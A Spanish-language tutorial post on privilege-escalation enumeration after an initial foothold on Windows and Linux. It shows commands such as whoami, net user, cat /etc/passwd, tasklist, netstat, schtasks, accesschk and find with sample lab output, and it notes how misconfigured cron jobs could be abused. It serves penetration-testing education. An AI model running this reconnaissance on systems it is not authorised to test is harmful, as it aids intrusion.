---
layout: post
title: Privilege Escalation
subtitle: Privilege Escalation Basics.
tags: [pen]
---
Durante una prueba de penetración, a menudo obtenemos un punto de apoyo inicial en un sistema como usuario estándar o sin privilegios. En estos casos, generalmente buscamos obtener derechos de acceso adicionales antes de que podamos demostrar el impacto total del compromiso. Este proceso se conoce como *escalada de privilegios* (PrivEsc) y es una habilidad necesaria, ya que los compromisos que ofrecen permisos de superusuario o root son raros en los entornos modernos.

En este módulo, supondremos que hemos obtenido acceso de usuario sin privilegios en un objetivo basado en Windows y Linux y demostraremos técnicas de escalada de privilegios en esos objetivos.

Si bien cada objetivo puede considerarse único debido a las diferencias en las versiones del sistema operativo, los niveles de aplicación de parches y varios otros factores, existen algunos enfoques comunes de escalada. Para aprovechar esto, buscaremos servicios mal configurados, restricciones de permisos de archivo insuficientes en binarios o servicios, vulnerabilidades directas del kernel, software vulnerable que se ejecuta con privilegios altos, información confidencial almacenada en archivos locales, configuraciones de registro que siempre elevan los privilegios antes de ejecutar un binario, instalación scripts que pueden contener credenciales codificadas y muchos otros.

<br />

### 1. Information Gathering.

Después de comprometer a un objetivo y ganar el punto de apoyo inicial como usuario sin privilegios, nuestro primer paso es recopilar la mayor cantidad de información posible sobre nuestro objetivo. Esto nos permite obtener una mejor comprensión de la naturaleza de la máquina comprometida y descubrir posibles vías para la escalada de privilegios.

En esta sección, exploraremos las técnicas manuales, y automatizadas de recopilación y enumeración de información y discutiremos las fortalezas y debilidades de cada una.

<br />

#### 1.1. Manual Enumeration.

Enumerar manualmente el sistema puede consumir mucho tiempo. Sin embargo, esta aproximación permite tener más control sobre la enumeración que se realiza tanto manualmente como de forma automatizada, así como la detección de métodos de PrivEsc que pueden escaparse a herramientas automatizadas.

<br />

##### 1.1.1. Enumerating Users (whoami, net user, id, /etc/passwd).

Cuando accedemos a una máquina una de las primeras cosas que debemos identificar es el contexto del usuario con que el hemos obtenido acceso. Para esto utilizamos el comando **whoami**, disponible tanto en Windows como en Linux:

```
C:\Users\student>whoami
client251\student

student@server:~$ whoami
student
```

A menudo esta información también está en el prompt pero a veces puede no estar.

Una vez sabemos el usuario que tenemos, queremos saber el contexto de este usuario a nivel de grupos y en general de permisos. Para ello empleamos las utilidades **net user** en Windows e **id** en Linux.

- **net user** 

```
C:\Users\student>net user student
User name                    student
Full Name
Commen
User's commen
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/31/2018 10:37:35 AM
Password expires             Never
Password changeable          3/31/2018 10:37:35 AM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon scrip
User profile
Home directory
Last logon                   11/8/2019 12:56:15 PM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users *Users
Global Group memberships     *None
The command completed successfully.
```


- **id**

```
student@debian:~$ id
uid=1000(student) gid=1000(student) groups=1000(student)
```

<br />

También nos puede interesar descubrir información acerca de la existencias de otras cuentas, para ello empleamos en sistemas Windows **net user** y en Linux el fichero **/etc/passwd** al que generalmente se tiene acceso sin permisos elevados.


- **net user**

```
C:\Users\student>net user

User accounts for \\CLIENT251

-------------------------------------------------------------------------------
admin                    Administrator            DefaultAccount
Guest                    student                  WDAGUtilityAccount
The command completed successfully.
```

El output revela la existencia de otras cuentas.

<br />

- **cat /etc/passwd**

```
student@debian:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
...
speech-dispatcher:x:108:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
...
xrdp:x:114:120::/var/run/xrdp:/bin/false
student:x:1000:1000:Student,PWK,,:/home/student:/bin/bash
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
```

El fichero revela la existencia de otras cuentas, incluso de cuentas que no pertenecen a usuarios humanos como *www-data* que es la cuenta que inicia el servicio http.

<br />

##### 1.1.2. Enumerating the Hostname (Hostname).

También puede ser conveniente saber cuál es el *hostname* de la máquina, este es sobretodo importantes en contextos de redes corporativas ya que el hostname podría dar pistas acerca de la funcionalidad del host en dicha red. 

Podemos utilizar la utilidad **hostname** presente en los dos sistemas operativos

```
C:\Users\student>hostname
client251

student@debian:~$ hostname
debian
```

<br />

##### 1.1.3. Enumerating the Operating System Version and Architecture (systeminfo, uname, /etc/issue, /etc/\*-release).

Existen métodos de PrivEsc que competen directamente al *kernel* (kernel exploits). Estos exploits están asociados a unos agentes concretos (systema operativo y versión) de forma que puede ser útil saber cómo recopilar esta información. 

- En sistemas Windows podemos emplear **systeminfo**:

```
C:\Users\student>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.16299 N/A Build 16299
System Type:               X86-based PC
```

En el comando anterior primro desplegamos el output de systeminfo y luego filtramos con la utilidad findstr.

- En sistemas Linux podemos utilizar el contenido de ficheros como **/etc/issue** o el conjunto **/etc/\*-release** o el comando **uname -a**

```
student@debian:~$ cat /etc/issue
Debian GNU/Linux 9 \n \l

student@debian:~$ cat /etc/*-release
PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
NAME="Debian GNU/Linux"
VERSION_ID="9"
VERSION="9 (stretch)"
ID=debian
...

student@debian:~$ uname -a
Linux debian 4.9.0-6-686 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) i686 GNU/Linux
```

<br />

##### 1.1.4. Enumerating Running Processes and Services (tasklist, ps aux).

Uno de los principales vectores de escalada de privilegios suele ser un servicio mal configurado que nos permita explotar un RCE con permisos de administrador o superusuario. 

- En sistemas Windows, podemos ver los servicios con la utilidad **tasklist**. La opción **/SVC** devolverá los procesos que están mapeados sobre un determinado servicio Windows.

```
C:\Users\student>tasklist /SVC

Image Name                     PID Services
========================= ======== ============================================
...
lsass.exe                      564 KeyIso, Netlogon, SamSs, VaultSvc
svchost.exe                    676 BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
fontdrvhost.exe                684 N/A
fontdrvhost.exe                692 N/A
svchost.exe                    776 RpcEptMapper, RpcSs
dwm.exe                        856 N/A
svchost.exe                    944 Appinfo, BITS, DsmSvc, gpsvc, IKEEXT,
                                   iphlpsvc, LanmanServer, lfsvc, ProfSvc,
                                   Schedule, SENS, SessionEnv,
                                   ShellHWDetection, Themes, TokenBroker,
                                   UserManager, winmgmt, WpnService
svchost.exe                    952 TermService
svchost.exe                    960 BFE, CoreMessagingRegistrar, DPS, MpsSvc
svchost.exe                    988 Dhcp, EventLog, lmhosts, TimeBrokerSvc,
                                   WinHttpAutoProxySvc, wscsvc
...
mysqld.exe                    1816 mysql                                   
...
```

Observemos que el output no revela qué usuario está corriendo qué servicio, neceistamos privilegios de super usuario para acceder a esa información.

- En Linux podemos listar los procesos con la utilidad **ps** 

```
student@debian:~$ ps aux
USER       PID %CPU %MEM    VSZ   RSS STAT START   TIME COMMAND
root         1  0.0  0.6  28032  6256 Ss   Nov07   0:03 /sbin/init
root         2  0.0  0.0      0     0 S    Nov07   0:00 [kthreadd]
root       254  0.0  0.9  54536  9924 Ssl  Nov07   1:45 /usr/bin/vmtoolsd
root       255  0.0  0.0      0     0 S    Nov07   0:00 [kauditd]
root       259  0.0  0.4  25956  5100 Ss   Nov07   0:01 /lib/systemd/systemd-journald
root       294  0.0  0.4  17096  4996 Ss   Nov07   0:00 /lib/systemd/systemd-udevd
systemd+   309  0.0  0.3  16884  3940 Ssl  Nov07   0:07 /lib/systemd/systemd-timesyncd
root       359  0.0  0.0      0     0 S<   Nov07   0:00 [ttm_swap]
root       514  0.0  1.5  53964 16272 Ss   Nov07   0:00 /usr/bin/VGAuthService
root       515  0.0  0.2   5256  2816 Ss   Nov07   0:00 /usr/sbin/cron -f
message+   518  0.0  0.3   6368  3896 Ss   Nov07   0:37 /usr/bin/dbus-daemon --system.
rtkit      523  0.0  0.3  24096  3156 SNsl Nov07   0:00 /usr/lib/rtkit/rtkit-daemon
...
student   8868  0.0  0.3   7664  3336 pts/0    R+   14:25   0:00 ps axu
```

<br />

##### 1.1.5. Enumerating Networking Information (ip a, ipconfig, route print, netstat, /sbin/route, ss -anp).

El siguiente paso es hacer un analisis de las interfaces de red disponibles en el host. Con esto pretendemos ver a qué y cuántas redes pertenece nuestro host, habrá tantas como interfaces de red disponibles. 

- En Windows tenemos **ipconfig**, **route** y **netstat**:

```
C:\Users\student>ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : client251
   Primary Dns Suffix  . . . . . . . : corp.com
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : corp.com

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection
   Physical Address. . . . . . . . . : 00-0C-29-C1-ED-B0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::bc64:ab2f:a10f:edc9%15(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.11.0.22(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 
   DHCPv6 IAID . . . . . . . . . . . : 83889193
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-25-55-82-FF-00-0C-29-C1-ED-B0
   DNS Servers . . . . . . . . . . . : 10.11.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Intel(R) 82574L Gigabit Network Connection #2
   Physical Address. . . . . . . . . : 00-0C-29-C1-ED-BA
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::9d3e:158a:241b:beb7%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.1.111(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1
   DHCPv6 IAID . . . . . . . . . . . : 167775273
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-25-55-82-FF-00-0C-29-C1-ED-B0
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . .
```

<br />

```
C:\Users\student>route print
===========================================================================
Interface List
 15...00 0c 29 c1 ed b0 ......Intel(R) 82574L Gigabit Network Connection
  4...00 0c 29 c1 ed ba ......Intel(R) 82574L Gigabit Network Connection #2
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
==================ro=========================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0      192.168.1.1    192.168.1.111    281
          0.0.0.0          0.0.0.0        10.11.0.2       10.11.0.22    281
        10.11.0.0    255.255.255.0         On-link        10.11.0.22    281
       10.11.0.22  255.255.255.255         On-link        10.11.0.22    281
      10.11.0.255  255.255.255.255         On-link        10.11.0.22    281
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
      192.168.1.0    255.255.255.0         On-link     192.168.1.111    281
    192.168.1.111  255.255.255.255         On-link     192.168.1.111    281
    192.168.1.255  255.255.255.255         On-link     192.168.1.111    281
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link     192.168.1.111    281
        224.0.0.0        240.0.0.0         On-link        10.11.0.22    281
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link     192.168.1.111    281
  255.255.255.255  255.255.255.255         On-link        10.11.0.22    281
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0      192.168.1.1  Defaul
          0.0.0.0          0.0.0.0        10.11.0.2  Defaul
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
  4    281 fe80::/64                On-link
 15    281 fe80::/64                On-link
  4    281 fe80::9d3e:158a:241b:beb7/128
                                    On-link
 15    281 fe80::bc64:ab2f:a10f:edc9/128
                                    On-link
  1    331 ff00::/8                 On-link
  4    281 ff00::/8                 On-link
 15    281 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None
```

<br />

```
C:\Users\student>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       7432
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       776
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1472
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       952
  TCP    0.0.0.0:8895           0.0.0.0:0              LISTENING       2284
  TCP    0.0.0.0:9121           0.0.0.0:0              LISTENING       7432
...
  TCP    127.0.0.1:49689        127.0.0.1:49690        ESTABLISHED     2284
  TCP    127.0.0.1:49690        127.0.0.1:49689        ESTABLISHED     2284
  TCP    127.0.0.1:49691        127.0.0.1:49692        ESTABLISHED     2284
  TCP    127.0.0.1:49692        127.0.0.1:49691        ESTABLISHED     2284
...
```

<br />

- Por otra parte en sistemas Linux. Tenemos los siguientes utilidades:

```
student@debian:~$ ip a
...
4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group
    link/ether 00:50:56:8a:4d:48 brd ff:ff:ff:ff:ff:ff
    inet 10.11.0.128/24 brd 10.11.0.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:4d48/64 scope link 
       valid_lft forever preferred_lft forever
5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group
    link/ether 00:50:56:8a:5c:5e brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.112/24 brd 192.168.1.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5c5e/64 scope link 
```

<br />

```
student@debian:~$ /sbin/route
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
default         192.168.1.254   0.0.0.0         UG    0      0       0 ens192
10.11.0.0       0.0.0.0         255.255.255.0   U     0      0       0 ens224
192.168.1.0     0.0.0.0         255.255.255.0   U     0      0       0 ens192
```

Cabe destacar que el comando netstat en sistemas Linux ha quedado obsoleto y se ha sustituido por **ss**

```
student@debian:~$ ss -anp
Netid State   Recv-Q Send-Q  Local Address:Port  Peer Address:Port              
...
tcp   LISTEN  0      80  127.0.0.1:3306     *:*                  
tcp   LISTEN  0      128     *:22                *:*                  
tcp   ESTAB   0      48852   10.11.0.128:22      10.11.0.4:52804              
tcp   LISTEN  0      128     :::22               :::*                  
tcp   LISTEN  0      2       ::1:3350            :::*                  
tcp   LISTEN  0      2       :::3389             :::*
```

<br />



##### 1.1.6. Enumerating Firewall Status and Rules (netsh advfirewall, iptables, /etc/iptables).

Generalmente conocer el status del Firewall de un sistema y sus reglas es espcialmente interesante durante la fase de explotación aunque también tiene parte de interés de cara a la elevación de privilegios (ya que pueden haber servicios dirigidos por root que escuchan sólo en el loopback y que externamente están filtrados por el firewall) o una fase de post-explotación más general como pivoting o similar.

- En un sistema Windows podemos emplear **netsh**:

```
C:\Users\student>netsh advfirewall show currentprofile

Public Profile Settings:
---------------------------------------------------------------
State                          ON
Firewall Policy                BlockInbound,AllowOutbound
LocalFirewallRules             N/A (GPO-store only)
LocalConSecRules               N/A (GPO-store only)
InboundUserNotification        Enable
RemoteManagement               Disable
UnicastResponseToMulticast     Enable

Logging:
LogAllowedConnections          Disable
LogDroppedConnections          Disable
FileName                       %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                    4096

Ok.
```

<br />

```
C:\Users\student>netsh advfirewall firewall show rule name=all

Rule Name:         @{Microsoft.Windows.Photos_2018.18022.15810.1000_x86__8wekyb3d8bbw
---------------------------------------------------
Enabled:           Yes
Direction:         In
Profiles:          Domain,Private,Public
Grouping:          Microsoft Photos
LocalIP:           Any
RemoteIP:          Any
Protocol:          Any
Edge traversal:    Yes
Action:            Allow

Rule Name:         @{Microsoft.Windows.Photos_2018.18022.15810.1000_x86__8wekyb3d8bbw
----------------------------------------------------------------------
Enabled:           Yes
Direction:         Out
Profiles:          Domain,Private,Public
Grouping:          Microsoft Photos
LocalIP:           Any
RemoteIP:          Any
Protocol:          Any
Edge traversal:    No
Action:            Allow

Rule Name:         @{Microsoft.XboxIdentityProvider_12.39.13003.1000_x86__8wekyb3d8bb
----------------------------------------------------------------------
...
```

<br />

- En sistemas Linux necesitamos privilegios de root para listar las reglas de firewall con la utilidad **iptables**. Sin embargo, en ciertas ocasiones podemos ver ciertas reglas del firewall como usuario estandard en función de cómo está este configurado. Por ejemplo, el paquete iptables -persistent en Debian Linux guarda las reglas del firewall en archivos específicos en el directorio /etc/iptables de forma predeterminada. El sistema utiliza estos archivos para restaurar las reglas de netfilter en el momento del arranque. Estos archivos a menudo se dejan con permisos débiles, lo que les permite ser leídos por cualquier usuario local en el sistema de destino. También podemos buscar archivos creados por el comando iptables-save , que se usa para volcar la configuración del firewall en un archivo especificado por el usuario. Este archivo generalmente se usa como entrada para el comando iptables-restore y se usa para restaurar las reglas del firewall en el momento del arranque. Si un administrador del sistema alguna vez ejecutó este comando, podríamos buscar en el directorio de configuración ( / etc ) o grep en el sistema de archivos para los comandos de iptables para ubicar el archivo. Si el archivo tiene permisos inseguros, podríamos usar el contenido para inferir las reglas de configuración del firewall que se ejecutan en el sistema.

<br />

##### 1.1.7. Enumerating Scheduled Tasks (schtasks, /etc/cront.\*, /etc/crontab).

Otro vector común en operaciones de PrivEsc consiste en el aprovechamiento de tareas programadas mal configuradas. 

Es común que servidores ejecuten tareas de administración o mantenimiento del sistema (observemos que a menudo involucran permisos de administrador) de forma automatizada ya sea periódicamente o tras un evento desencadenante como un logeo remoto, la creación de un usuario, etc. Cuando estas tareas quedan malconfiguradas se pueden utilizar para ganar RCE sobre el sistema con un usuario con permisos elevados.

- En sistemas Windows, podemos utilizar la utilidad **schtasks**:

```
c:\Users\student>schtasks /query /fo LIST /v

Folder: 
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft
INFO: There are no scheduled tasks presently available at your access level.

Folder: \Microsoft\Office
HostName:                             CLIENT251
TaskName:                             \Microsoft\Office\Office 15 Subscription Heartbeat
Next Run Time:                        11/12/2019 3:18:24 AM
Status:                               Ready
Logon Mode:                           Interactive/Background
Last Run Time:                        11/11/2019 3:49:25 AM
Last Result:                          0
Author:                               Microsoft Office
Task To Run:                          %ProgramFiles%\Common Files\Microsoft Shared\Office16\OLicenseHeartbeat.exe
Start In:                             N/A
Comment:                              Task used to ensure that the Microsoft Office Subscription licensing is current.
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          SYSTEM
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 04:00:00
Schedule:                             Scheduling data is not available in this format
Schedule Type:                        Daily
Start Time:                           12:00:00 AM
Start Date:                           1/1/2010
End Date:                             N/A
Days:                                 Every 1 day(s)
Months:                               N/A
Repeat: Every:                        Disabled
Repeat: Until: Time:                  Disabled
Repeat: Until: Duration:              Disabled
Repeat: Stop If Still Running:        Disabled
...
```

Como se puede observar. el output es autodescriptivo.

- En sistemas Linux, las tareas programadas se listan en ficheros como **/etc/crontab** y **/etc/cron.\*** (donde el asterísco representa el término de la frecuencia con la que se ejecutan las tareas). Así por ejemplo, las tareas programadas que se ejecutan todos los días se encontraran en **/etc/cron.daily**. Podemos tener un rápido acceso a todos los scripts mediante:

```
student@debian:~$ ls -lah /etc/cron*
-rw-r--r-- 1 root root  722 Oct  7  2017 /etc/crontab

/etc/cron.d:
-rw-r--r--   1 root root  285 May 29  2017 anacron
-rw-r--r--   1 root root  712 Jan  1  2017 php
-rw-r--r--   1 root root  102 Oct  7  2017 .placeholder

/etc/cron.daily:
-rwxr-xr-x   1 root root  311 May 29  2017 0anacron
-rwxr-xr-x   1 root root  539 Mar 30  2018 apache2
-rwxr-xr-x   1 root root 1.5K Sep 13  2017 apt-compat
-rwxr-xr-x   1 root root  355 Oct 25  2016 bsdmainutils
-rwxr-xr-x   1 root root  384 Dec 12  2012 cracklib-runtime
-rwxr-xr-x   1 root root 1.6K Feb 22  2017 dpkg
-rwxr-xr-x   1 root root   89 May  5  2015 logrotate
-rwxr-xr-x   1 root root 1.1K Dec 13  2016 man-db
-rwxr-xr-x   1 root root  249 May 17  2017 passwd
-rw-r--r--   1 root root  102 Oct  7  2017 .placeholder

/etc/cron.hourly:
-rw-r--r--   1 root root  102 Oct  7  2017 .placeholder

/etc/cron.monthly:
-rwxr-xr-x   1 root root  313 May 29  2017 0anacron
-rw-r--r--   1 root root  102 Oct  7  2017 .placeholder

/etc/cron.weekly:
-rwxr-xr-x   1 root root  312 May 29  2017 0anacron
-rwxr-xr-x   1 root root  723 Dec 13  2016 man-db
-rw-r--r--   1 root root  102 Oct  7  2017 .placeholder
```

Además, los administradores del sistema tienen su propio fichero cron, en **/etc/crontab**:

```
student@debian:~$ cat /etc/crontab 
...

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
5 0	* * *	root	/var/scripts/user_backups.sh
```

El output anterior revela que cada 5 minutos se ejecuta un script de backups. Si este script estuviera mal implementado, podría ser utilizado para hacer que root ejecutara comandos arbitrarios elegidos por nosotros.

<br />

##### 1.1.8. Enumerating Installed Applications & Patch Levels (wmic, wmic qfe, dpkg)

Otro vector común paralelo a los servicios mal configurados serían las aplicaciones instaladas en un sistema y los patchs de seguridad. De la misma forma que un servico mal configurado, una aplicación mal configurada o que utiliza librerias inseguras puede conducir a un RCE por parte de un usuario con privilegios elevados.

- En sistemas Windows podemos emplear la utilidad **wmic** que responde al acrónimo *Windows Management Instrumentation*, se trata de una aplicación que ofrece infraestructura para el manejo de datos y operaciones en Windows.

Así, el siguiente comando emplea el argumento de la calse *producto* para obtener las aplicaciones que están instaladas en el sistema junto con el nombre, la versión y el distribuidor:

```
c:\Users\student>wmic product get name, version, vendor
Name                                       Vendor                      Version
Microsoft OneNote MUI (English) 2016       Microsoft Corporation       16.0.4266.1001
Microsoft Office OSM MUI (English) 2016    Microsoft Corporation       16.0.4266.1001
Microsoft Office Standard 2016             Microsoft Corporation       16.0.4266.1001
Microsoft Office OSM UX MUI (English) 2016 Microsoft Corporation       16.0.4266.1001
Microsoft Office Shared Setup Metadata MUI Microsoft Corporatio
[...]
```

De igual manera, podemos listar actualizaciones de seguridad en el sistema con **wmic qfe**:

```
c:\Users\student>wmic qfe get Caption, Description, HotFixID, InstalledOn
Caption                                     Description      HotFixID   InstalledOn
                                            Update           KB2693643  4/7/2018
http://support.microsoft.com/?kbid=4088785  Security Update  KB4088785  3/31/2018
http://support.microsoft.com/?kbid=4090914  Update           KB4090914  3/31/2018
http://support.microsoft.com/?kbid=4088776  Security Update  KB4088776  3/31/2018
```

<br />

- En sistemas Linux podemos acudir a gestores de paquetes (packet managers) como **dpkg**:

```
student@debian:~$ dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                Version           Architecture  Description
+++-===================-=================-=============-=============================
ii  acl                 2.2.52-3+b1       i386          Access control list utilities
ii  adduser             3.115             all           add and remove users and grou
ii  adwaita-icon-theme  3.22.0-1+deb9u1   all           default icon theme of GNOME
ii  alsa-utils          1.1.3-1           i386          Utilities for configuring and
ii  anacron             2.3-24            i386          cron-like program that doesn'
ii  ant                 1.9.9-1           all           Java based build tool like ma
ii  ant-optional        1.9.9-1           all           Java based build tool like ma
ii  apache2             2.4.25-3+deb9u4   i386          Apache HTTP Server
ii  apache2-bin         2.4.25-3+deb9u4   i386          Apache HTTP Server (modules a
ii  apache2-data        2.4.25-3+deb9u4   all           Apache HTTP Server (common fi
ii  apache2-utils       2.4.25-3+deb9u4   i386          Apache HTTP Server (utility p
```

<br />

##### 1.1.9 Enumerating Readable/Writable Files and Directories (AccessChk, Get-Acl, find).

Archivos con restricciones insuficientes pueden terminar generando una vulnerabilidad de elevación de privilegios. Por ejemplo cuando un atacante puede modificar scripts o binarios que se ejecutan por una cuenta de administrador.

Por otra parte, ficheros propiedad del administrador o superusuario pueden contener información sensible como credenciales o demás, de forma que poder leer el contenido de estos ficheros también puede conducir a una posible vulnerabilidad de PrivEsc.

- Hay una gran variedad de utilidades que pueden automatizar esta tarea para nosotros en un sistema Windows, por ejemplo; **AccessChk** del kit Sysinternals:

```
c:\Tools\privilege_escalation\SysinternalsSuite>accesschk.exe -uws "Everyone" "C:\Program Files"

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

RW C:\Program Files\TestApplication\testapp.exe
```

En el ejemplo anterior se emplea sysinternals para enumerar, dentro de *C:\\Program Files*  de forma recursiva (-s) ficheros sobre los que cualquier usuario perteneciente al grupo "Everyone" pueda escribir (-w) y además pedimos que se supriman errores.

Además, podemos combinar esta herramienta con PowerShell, por ejemplo, podemos utilizar **Get-Acl** que obtiene los permisos para un fichero o directorio dado. Sin embargo este no puede ser utilizado de forma recursiva por lo que neceistaremos de ciertas habilidades de programación para poder utilizarlo de una forma eficiente además de eficaz. 

```
PS C:\Tools\privilege_escalation\SysinternalsSuite>Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}


    Directory: C:\Program Files\TestApplication


Path        Owner                  Access
----        -----                  ------
testapp.exe BUILTIN\Administrators Everyone Allow  Modify, Synchronize...
```

Así, el comando anterior primero lista los contenidos de un directorio de forma recursiva y los pasa através de Get-Acl y seguidamente los filtra para obtener aquellos archivos modificables por el grupo Everyone.

<br />

- En los sistemas Linux podemos utilizar la utilidad **find**, para descubrir archivos con permisos inseguros:

```
student@debian:~$ find / -writable -type d 2>/dev/null
/usr/local/james/bin
/usr/local/james/bin/lib
/proc/16195/task/16195/fd
/proc/16195/fd
/proc/16195/map_files
/home/student
/home/student/.gconf
/home/student/.gconf/apps
/home/student/.gconf/apps/gksu
/home/student/Music
/home/student/thinclient_drives
/home/student/Videos
/home/student/.pcsc11
/home/student/.gnupg
...
```

<br />


##### 1.1.10. Enumerating Unmounted Disks (mountvol, /etc/stab, mount, lsblk).

Para ver todos los dispositivos montados (ya que con mirar el sitio en el que se montan por defecto no basta pues pueden estar montados en otro lado) podemos utilizar las siguientes utilidades:

- En sistemas Windows utilizamos **mountvol** para listar todos los drives actualmente montados:

```
c:\Users\student>mountvol
Creates, deletes, or lists a volume mount point.
...
Possible values for VolumeName along with current mount points are:

    \\?\Volume{25721a7f-0000-0000-0000-100000000000}\
        *** NO MOUNT POINTS ***

    \\?\Volume{25721a7f-0000-0000-0000-602200000000}\
        C:

    \\?\Volume{78fa00a6-3519-11e8-a4dc-806e6f6e6963}\
        D:
```

- En sistemas Linux existen dos utilidades, examinar el fichero **/etc/stab** y emplear el comando **mount**:

```
student@debian:~$ cat /etc/fstab 
# /etc/fstab: static file system information.
...
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/sda1 during installation
UUID=fa336f7a-8cf8-4cd2-9547-22b08cf58b72 /     ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=8b701d25-e290-49dc-b61b-1b9047088150 none  swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

student@debian:~$ mount
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=505664k,nr_inodes=126416,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=102908k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
...
mqueue on /dev/mqueue type mqueue (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime)
